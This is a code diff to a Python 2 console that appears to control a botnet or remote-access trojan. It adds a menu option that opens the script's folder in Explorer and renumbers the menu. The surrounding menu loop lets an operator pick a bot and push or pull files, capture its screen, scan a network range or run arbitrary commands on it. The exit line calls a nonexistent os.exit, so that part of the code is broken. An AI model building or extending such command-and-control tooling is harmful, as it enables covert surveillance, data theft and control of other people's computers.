@@ -114,6 +114,11 @@ def add_bot(client):
     print('>>> \n')
 
 
+def show_files():
+    path = os.path.dirname(os.path.abspath(__file__))
+    subprocess.Popen(r'explorer /select, %s' % path)
+
+
 def end():
     # Terminates the execution
 
@@ -133,6 +138,7 @@ def menu():
 
     # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
     descriptions = ['View bots',
+                    'Open File Structure',
                     'Send File',
                     'Get File',
                     'Bot Screen Shot',
@@ -304,31 +310,34 @@ while True:
     if select == 0:  # View list of bots
         view_bots()
 
-    elif select == 1:  # Send File
+    elif select == 1:  # Open folder
+        show_files()
+
+    elif select == 2:  # Send File
         send_host = (set_bot(raw_input('pick a bot')))
         file_to_send = raw_input('The File >>> \n')
         send_file(file_to_send)
 
-    elif select == 2:  # Get File
+    elif select == 3:  # Get File
         send_host = (set_bot(raw_input('pick a bot')))
         file_to_get = raw_input('The File >>> \n')
         get_file(file_to_get)
 
-    elif select == 3:  # Tell bot to Screen Shot
+    elif select == 4:  # Tell bot to Screen Shot
         send_host = (set_bot(raw_input('pick a bot')))
         take_ss()
 
-    elif select == 4:  # Tell bot to Scan network
+    elif select == 5:  # Tell bot to Scan network
         send_host = (set_bot(raw_input('pick a bot')))
         ip_to_scan = raw_input('Enter a IP + CIDR (ex.: 192.168.1.0/24) >>> \n')
         do_scan(ip_to_scan)
 
-    elif select == 5:  # Tell bot to run a command
+    elif select == 6:  # Tell bot to run a command
         send_host = (set_bot(raw_input('pick a bot')))
         cmd_to_run = raw_input('The CMD >>> \n')
         send_cmd(cmd_to_run)
 
-    elif select == 6:  # Exit the Script
+    elif select == 7:  # Exit the Script
         os.exit(1)
 
     else:
